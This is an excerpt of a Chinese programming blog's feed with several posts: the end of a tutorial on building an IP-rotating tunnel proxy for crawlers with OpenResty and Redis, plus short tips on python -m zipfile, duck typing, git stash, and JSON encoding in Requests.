ngx.log(ngx.ERR,&quot;redis data = &quot;, proxy_ip, &quot;:&quot;, proxy_port);</span><br><span class="line">            ngx.ctx.proxy_host = proxy_ip</span><br><span class="line">            ngx.ctx.proxy_port = proxy_port</span><br><span class="line">            redis_instance:close()</span><br><span class="line">        &#125;</span><br><span class="line">        #  下面是本机的端口，也就是爬虫固定写死的端口</span><br><span class="line">       listen 0.0.0.0:9976; #监听本机地址和端口，当使用keeplived的情况下使用keeplived VIP</span><br><span class="line">       proxy_connect_timeout 3s;</span><br><span class="line">       proxy_timeout 10s;</span><br><span class="line">       proxy_pass backend; #这里填写对端的地址</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要修改的地方，我在配置文件里面已经做好的注释。具体而言，需要修改地方包含：</p><ul><li>Redis的地址、端口、密码和 Key。如果你的Redis没有密码，可以把设置密码的这一行删掉</li></ul><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-18-54.png" alt></p><ul><li>入口代理的端口<br><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-21-19-36.png" alt></li></ul><p>设置好了这些配置以后，我们就可以使用Docker来启动它。Docker的配置文件极其简单：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openresty/openresty:centos</span><br><span class="line"></span><br><span class="line"><span class="keyword">copy</span><span class="bash"> nginx_redis.conf /usr/<span class="built_in">local</span>/openresty/nginx/conf/nginx.conf</span></span><br></pre></td></tr></table></figure><p>然后，执行命令构建和运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build --network host -t tunnel_proxy:0.01 .</span><br><span class="line">docker run --name tunnel_proxy --network host -it tunnel_proxy:0.01</span><br></pre></td></tr></table></figure><p>运行以后，你会看到Docker的命令行似乎卡住了。这是正常请求。因为需要你有了请求，它才会输出内容。</p><p>现在，你可以用Requests赶快写一段代码来进行验证：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">proxies = &#123;<span class="string">'http'</span>: <span class="string">'http://13.88.220.207:9976'</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    resp = requests.get(<span class="string">'http://httpbin.org/ip'</span>, proxies=proxies).text</span><br><span class="line">    print(resp)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-41-21.png" alt></p><p>说明隧道代理搭建成功。目前隧道代理我已经稳定运行了半年，从来没有出过问题，大家可以放心使用。</p><p>最后，本文受到 @萌木盖 的文章：<a href="https://www.jianshu.com/p/7808ee6395ab" target="_blank" rel="noopener">openresty正向代理搭建 - 简书</a>的启发，并在该文章基础上进行改进。特别感谢原作者。</p><hr><p>如果本文讲到的方法，能帮你节省下不少购买隧道代理的钱，那么请考虑拿出其中的一小部分，加入我的知识星球，成为<code>未闻Code·Pro会员</code>。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/51122141524284T2.JPG" alt></p><p>加入星球，你除了能获得在微信群中已有的全部福利外，还会额外获得：</p><ol><li>问题的优先解答和一对一答疑</li><li>职业生涯规划咨询</li><li>面试技巧和经验</li><li>定期开展的专属直播分享</li><li>定期抽奖活动</li><li>……</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;什么是隧道代理？我们来看下面这张截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-41-21.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;所谓隧道代理，就是一个能帮你自动更换代理 IP 的代理服务。在你的代码里面，你只需要把一个入口代理地址写死，然后正常发起请求，而目标服务器接收到的请求，每一次都是不同的代理地址。&lt;/p&gt;
&lt;p&gt;在某代理网站上，隧道代理50并发每秒的价格是4000元/月：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-47-07.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;而常规的，先请求接口拿到一批代理 IP，再选一个发起请求的原始代理服务器，一个月价格才600多元：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-23-08-49-41.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;所以，如果我们能自己做一个隧道代理，将会省下很多钱！&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="隧道代理" scheme="https://www.kingname.info/tags/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86/"/>
    
      <category term="OpenResty" scheme="https://www.kingname.info/tags/OpenResty/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：Linux 中，没有 zip命令，怎么生成 zip 文件？</title>
    <link href="https://www.kingname.info/2021/07/03/compress-without-zip/"/>
    <id>https://www.kingname.info/2021/07/03/compress-without-zip/</id>
    <published>2021-07-03T14:25:47.000Z</published>
    <updated>2021-07-03T14:26:56.278Z</updated>
    
    <content type="html"><![CDATA[<p>大家有时候可能需要在 Linux 上面生成 zip 文件或者对一个 zip 文件进行解压。如果你在网上搜索怎么在 Linux 解压 zip 文件，你一般会看到下面这样的回答：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-00.png" alt></p><p>但如果你手边刚好有一台 Linux 服务器的话，你可以试一试，一般你会得到这样的返回：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-47.png" alt></p><a id="more"></a><p>这是因为，<code>zip</code>、<code>unzip</code> 这两个命令，是需要单独安装的，并不是系统默认的命令。但有时候，我们拿到的 Linux 服务器并没有管理员权限，我们不能自己安装任何东西，只能使用系统已有的命令。</p><p>一般主流的 Linux 发行版都会默认自带 Python。有了 Python，我们也可以对文件进行压缩。可能有人又说，他不会 Python、或者他不会 Vim，在 Linux 上写代码太麻烦。</p><p>今天我们讲一个方法，只需要执行命令，不需要写 Python 代码。</p><p>命令的格式为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把一个或多个文件压缩到一个 zip 文件中</span></span><br><span class="line">python -m zipfile -c xxx.zip 文件<span class="number">1</span> 文件<span class="number">2</span> 文件<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把一个文件夹压缩</span></span><br><span class="line">python -m zipfile -c monty.zip 文件夹名</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压一个 zip 文件到指定文件夹中</span></span><br><span class="line">python -m zipfile -e xxx.zip 目标文件夹名</span><br></pre></td></tr></table></figure><p>就这么简单，无论你想压缩一个或多个文件，还是想压缩整个文件夹，还是想解压一个 zip 文件，都可以使用上面的命令轻松搞定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;大家有时候可能需要在 Linux 上面生成 zip 文件或者对一个 zip 文件进行解压。如果你在网上搜索怎么在 Linux 解压 zip 文件，你一般会看到下面这样的回答：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-00.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;但如果你手边刚好有一台 Linux 服务器的话，你可以试一试，一般你会得到这样的返回：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-29-20-22-47.png&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="一日一技" scheme="https://www.kingname.info/tags/%E4%B8%80%E6%97%A5%E4%B8%80%E6%8A%80/"/>
    
      <category term="Linux" scheme="https://www.kingname.info/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>面试扣分点：什么是鸭子类型</title>
    <link href="https://www.kingname.info/2021/07/03/what-is-duck-type/"/>
    <id>https://www.kingname.info/2021/07/03/what-is-duck-type/</id>
    <published>2021-07-03T14:22:55.000Z</published>
    <updated>2021-07-03T14:27:10.600Z</updated>
    
    <content type="html"><![CDATA[<p>有一类面试官特别讨厌，面试的时候，会问一些偏、难、怪的题目。假设你今天去面试，遇到面试官问你：“什么是鸭子类型？”。你怎么回答？</p><p>熟读维基百科的你，脑海中闪过了下面这张截图：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-07-04.png" alt></p><p>图中的红框像闪电一样从你的脑子里划过。你用中指扶了扶黑框眼镜，自信地说道：</p><blockquote><p>鸭子类型就是说，一个函数不会关心它传入参数的类型，只关心这个参数对应的对象有没有自己想要的方法和属性。如果有，就能运行。如果没有，就不能运行。这就像是我看到了一只鸟，只要它能像鸭子一样叫，像鸭子一样走路，有鸭子一样的白色羽毛，那么，无论它实际上是什么东西，我都认为它是鸭子。</p></blockquote><p>说完这段话，一道光从你的镜片上一闪而过。你心里想，这下稳了。</p><a id="more"></a><p>面试官又问：那你用 Golang 写一个鸭子类型的例子。</p><p>你一想，Golang 是静态语言啊，参数都要声明类型的，怎么绕过它的类型检测呢？你又转念再一想，不对，Golang 确实可以绕过类型检测的。使用接口就可以了。</p><p>于是你刷刷刷写下来一段 Golang 语言的代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Animal <span class="keyword">interface</span> &#123;</span><br><span class="line">    Sleep()</span><br><span class="line">    Eat(food <span class="keyword">string</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> People <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Pet <span class="keyword">struct</span> &#123;</span><br><span class="line">    name <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p People)</span> <span class="title">Sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(p.name, <span class="string">"在睡觉"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pet)</span> <span class="title">Sleep</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(p.name, <span class="string">"在睡觉"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p People)</span> <span class="title">Eat</span><span class="params">(food <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%s在吃%s\n"</span>, p.name, food)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Pet)</span> <span class="title">Eat</span><span class="params">(food <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"%s在吃%s\n"</span>, p.name, food)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">check</span><span class="params">(animal Animal)</span></span> &#123;</span><br><span class="line">    animal.Eat(<span class="string">"狗狼"</span>)</span><br><span class="line">    animal.Sleep()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    singleDog := People&#123;name: <span class="string">"单身狗"</span>,&#125;</span><br><span class="line">    dog := Pet&#123;name: <span class="string">"旺财"</span>,&#125;</span><br><span class="line">    check(singleDog)</span><br><span class="line">    check(dog)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-38-04.png" alt></p><p>然后你解释道，在函数<code>main()</code>里面，变量<code>singleDog</code>的类型是 <code>People</code> 类型，变量<code>dog</code>的类型是<code>Pet</code>类型。虽然他们是不同的类型，但是由于他们都有<code>Eat</code>方法和<code>Sleep</code>方法，所以，他们都能在<code>check</code>函数里面运行。</p><p>面试官又问，你的代码写得没有问题，例子也举得没有问题。那我再问你，既然<code>check</code>函数不关心传入参数的类型，只关心他们的方法，是不是说明<code>check</code>函数接收的参数是鸭子类型？</p><p>你说，是的。</p><p>面试官又问，但是，我们从代码里面可以看到，<code>check</code>函数接收的这个参数<code>animal</code>的类型是接口类型。那是不是说明<code>接口类型</code>等于<code>鸭子类型</code>？</p><p>你一时回答不上来。</p><p>面试官又问：那接口类型和鸭子类型是什么关系？鸭子类型是像<code>int</code>、<code>string</code>、<code>map</code>这样内置的类型吗？我们可以在 Golang 里面使用<code>var a  string</code> 声明一个类型为<code>string</code>的变量，那请问怎么声明一个类型为鸭子的变量？</p><p>你一时想不起来 Golang 自带的关键词里面，哪个关键词包含<code>duck</code>这个单词。</p><p>面试官露出了耐克式的微笑，对你说：“回家等通知吧。”</p><p>这个讨厌的面试官最后一个问题把你难住了。但是这个问题其实是一个陷阱。面试官给你玩了一个文字游戏。当他把<code>鸭子类型</code>和<code>整型、字符串类型</code>合在一起说的时候，让你觉得<code>鸭子类型</code>也是一种类型。但实际上<code>鸭子类型</code>并不是一种类型，<code>鸭子类型</code>是一种动态类型的风格：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-55-07.png" alt></p><p>怎么解释什么叫做设计风格呢？我们再用 Python 举个例子：</p><ul><li>确保传入的变量必须是特定类型，再执行对应的方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 确保参数是特定类型再调用里面的方法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(animal)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(animal, Pet):</span><br><span class="line">        animal.eat()</span><br><span class="line">    <span class="keyword">elif</span> isinstance(animal, People):</span><br><span class="line">        animal.eat()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">"类型错误！"</span>)</span><br></pre></td></tr></table></figure><ul><li>不管传入的参数是什么类型，只要它有 <code>eat</code>方法都能执行。如果这个对象没有<code>eat</code>方法，Python 自动就会抛出异常。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(animal)</span>:</span></span><br><span class="line">    animal.eat()</span><br></pre></td></tr></table></figure><p>在鸭子类型这种设计<code>风格</code>中，开发者不关心对象是什么类型。它只关心对象有没有特定的方法。</p><p>总结：鸭子类型是一种设计风格，不是一种具体的类型。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有一类面试官特别讨厌，面试的时候，会问一些偏、难、怪的题目。假设你今天去面试，遇到面试官问你：“什么是鸭子类型？”。你怎么回答？&lt;/p&gt;
&lt;p&gt;熟读维基百科的你，脑海中闪过了下面这张截图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-01-23-07-04.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;图中的红框像闪电一样从你的脑子里划过。你用中指扶了扶黑框眼镜，自信地说道：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;鸭子类型就是说，一个函数不会关心它传入参数的类型，只关心这个参数对应的对象有没有自己想要的方法和属性。如果有，就能运行。如果没有，就不能运行。这就像是我看到了一只鸟，只要它能像鸭子一样叫，像鸭子一样走路，有鸭子一样的白色羽毛，那么，无论它实际上是什么东西，我都认为它是鸭子。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;说完这段话，一道光从你的镜片上一闪而过。你心里想，这下稳了。&lt;/p&gt;
    
    </summary>
    
      <category term="面试" scheme="https://www.kingname.info/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="面试" scheme="https://www.kingname.info/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：使用 Git 在错误的分支上修改了代码怎么办？</title>
    <link href="https://www.kingname.info/2021/07/03/use-git-stash/"/>
    <id>https://www.kingname.info/2021/07/03/use-git-stash/</id>
    <published>2021-07-03T14:17:13.000Z</published>
    <updated>2021-07-03T14:27:25.551Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，在使用 Git 的时候，应该要正确使用它的分支（Branch）功能。不同的功能使用不同的分支开发，最后合并进入主分支。但有时候会出现这样一种情况——我代码都已经写完了，才发现我写错分支了。这个时候，怎么把我的修改迁移到目标分支上，并且不修改现在正在使用的分支？</p><a id="more"></a><p>我们用一个简单的例子来说明这种情况。</p><p>首先创建一个文件夹：<code>test_git</code>，并且在里面创建一个1.txt 文件，这个文件的内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">11111</span><br><span class="line">22222</span><br><span class="line">33333</span><br><span class="line">44444</span><br><span class="line">aaaaa</span><br><span class="line">bbbbb</span><br><span class="line">ccccc</span><br></pre></td></tr></table></figure><p>如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-03-26.png" alt></p><p>接下来，我执行命令<code>git init</code>，把当前文件夹作为一个git 源，并把1.txt 提交到源里面，让 git 进行管理。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-04-45.png" alt></p><p>现在，我基于当前分支，创建一个<code>dev</code>分支。并对新分支里面的1.txt 文件进行修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b dev</span><br><span class="line">vim 1.txt</span><br><span class="line">git add 1.txt</span><br><span class="line">git commit -m <span class="string">'change 1.txt'</span></span><br></pre></td></tr></table></figure><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-06-15.png" alt></p><p>好了，现在准备工作做完了。我现在有两个分支<code>master</code>和<code>dev</code>。每个分支里面都有一个叫做<code>1.txt</code>的文件。并且这两个<code>1.txt</code>文件的内容前半截相同，后半截不同。</p><p>大家可以看到，我现在在 dev 分支上。这个时候，我想修改 master 分支上面的1.txt。但是我忘记切换分支了。于是直接修改了dev 分支上的1.txt：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-08-23.png" alt="红框中的内容，原本是想在 master 分支修改的"></p><p>这个时候，如果我直接使用命令<code>git checkout master</code>试图切换分支，git 会报错，没有办法切过去：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-09-24.png" alt></p><p>很多人可能会这样做：打开一个记事本，把1.txt 里面修改的内容记录下来。然后使用命令<code>git checkout -- 1.txt</code>恢复1.txt 到修改之前的内容。然后切换到 master 分支。再根据记事本里面记录的修改内容，把代码粘贴到1.txt 文件中。如果只有1个文件修改那还好。但是在软件开发中，可能你修改了很多个文件。所以这种方法会变得非常笨拙。</p><p>但实际上，git 早就预料到了你有这个需求，所以它已经有了应对方案。我们现在回到刚刚在 dev 分支修改了1.txt 的时候：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-12-08.png" alt></p><p>这个时候，<strong>千万不要</strong>执行<code>git add</code>命令。</p><p>你只需要按顺序执行如下三条命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git stash</span><br><span class="line">git checkout master</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-13-52.png" alt></p><p>然后，我们打开1.txt 文件：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-07-02-20-15-00.png" alt></p><p>可以看到，刚才的修改已经自动应用到了master 分支的1.txt 上面了。</p><p><code>git stash</code>会把当前修改的内容缓存起来，并恢复当前工作区到你修改之前的状态。然后切换回 master 分支，执行命令<code>git stash pop</code>，把刚才的修改应用到 master 分支的1.txt 文件中。如果不出现冲突，那么它会自动修改1.txt 文件。如果出现了冲突，那么需要你打开1.txt 文件以后，手动解除冲突。</p><p>可以看到，使用<code>git stash</code>命令，比你单独手动记录修改的内容，切换分支再重新改一遍要方便很多。</p><p>更多 Git 相关的小技巧，大家可以在微软提供的学习网站进行学习：<a href="https://docs.microsoft.com/en-us/learn/modules/intro-to-git/?WT.mc_id=DT-MVP-5003916" target="_blank" rel="noopener">Introduction to Git - Learn | Microsoft Docs</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，在使用 Git 的时候，应该要正确使用它的分支（Branch）功能。不同的功能使用不同的分支开发，最后合并进入主分支。但有时候会出现这样一种情况——我代码都已经写完了，才发现我写错分支了。这个时候，怎么把我的修改迁移到目标分支上，并且不修改现在正在使用的分支？&lt;/p&gt;
    
    </summary>
    
      <category term="Git" scheme="https://www.kingname.info/categories/Git/"/>
    
    
      <category term="Git" scheme="https://www.kingname.info/tags/Git/"/>
    
  </entry>
  
  <entry>
    <title>为什么爬虫工程师应该有一些基本的后端常识？</title>
    <link href="https://www.kingname.info/2021/06/19/crawler-should-know-backend/"/>
    <id>https://www.kingname.info/2021/06/19/crawler-should-know-backend/</id>
    <published>2021-06-19T08:50:43.000Z</published>
    <updated>2021-06-19T08:51:46.804Z</updated>
    
    <content type="html"><![CDATA[<p>今天在粉丝交流群里面，有个同学说他发现了<code>Requests</code>的一个 bug，并修复了它：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-28-54.png" alt></p><p>聊天记录中对应的图片为：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-29-19.png" alt></p><p>看到这个同学的截图，我大概知道他遇到了什么问题，以及为什么会误认为这是 Requests 的 bug。</p><a id="more"></a><p>要解释这个问题，我们需要首先明白一个问题，那就是 JSON 字符串的两种显示形式和<code>json.dumps</code>的<code>ensure_ascii</code>参数。</p><p>假设我们在 Python 里面有一个字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info = &#123;<span class="string">'name'</span>: <span class="string">'青南'</span>, <span class="string">'age'</span>: <span class="number">20</span>&#125;</span><br></pre></td></tr></table></figure><p>当我们想把它转成 JSON 字符串的时候，我们可能会这样写代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line">info = &#123;<span class="string">'name'</span>: <span class="string">'青南'</span>, <span class="string">'age'</span>: <span class="number">20</span>&#125;</span><br><span class="line">info_str = json.dumps(info)</span><br><span class="line">print(info_str)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示，中文变成了 Unicode 码：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-33-18.png" alt></p><p>我们也可以增加一个参数<code>ensure_ascii=False</code>，让中文正常显示出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_str = json.dumps(info, ensure_ascii=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-34-30.png" alt></p><p>这位同学认为，由于<code>{&quot;name&quot;: &quot;\u9752\u5357&quot;, &quot;age&quot;: 20}</code>和<code>{&quot;name&quot;: &quot;青南&quot;, &quot;age&quot;: 20}</code>从字符串角度看，显然不相等。而 Requests 在 POST 发送数据的时候，默认是没有这个参数，而对<code>json.dumps</code>来说，省略这个参数等价于<code>ensure_ascii=True</code>：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-06-19-15-37-27.png" alt></p><p>所以实际上<code>Requests</code>在 POST 含有中文的数据时，会把中文转成 Unicode 码发给服务器，于是服务器根本就拿不到原始的中文信息了。所以就会导致报错。</p><p>但实际上，并不是这样的。我常常跟群里的同学说，做爬虫的同学，应该要有一些基本的后端常识，才不至于被这种现象误导。为了说明为什么上面这个同学的理解是错误的，为什么这不是 Requests 的 bug，我们自己来写一个含有 POST 的服务，来看看我们POST 两种情况的数据有没有区别。为了证明这个特性与网络框架无关，我这里分别使用Flask、Fastapi 、Gin 来进行演示。</p><p>首先，我们来看看Requests 测试代码。这里用3种方式发送了 JSON 格式的数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"></span><br><span class="line">body = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'青南'</span>,</span><br><span class="line">    <span class="string">'age'</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">'http://127.0.0.1:5000/test_json'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接使用 json=的方式发送</span></span><br><span class="line">resp = requests.post(url, json=body).json() </span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/json'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提前把字典序列化成 JSON 字符串，中文转成 Unicode，跟第一种方式等价</span></span><br><span class="line">resp = requests.post(url,</span><br><span class="line">                     headers=headers,</span><br><span class="line">                     data=json.dumps(body)).json()</span><br><span class="line">print(resp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提前把字典序列化成 JSON 字符串，中文保留</span></span><br><span class="line">resp = requests.post(url,</span><br><span class="line">                     headers=headers,</span><br><span class="line">                     data=json.dumps(body, ensure_ascii=<span class="literal">False</span>).encode()).json()</span><br><span class="line">print(resp)</span><br></pre></td></tr></table></figure><p>这段测试代码使用3种方式发送 POST 请求，其中，第一种方法就是 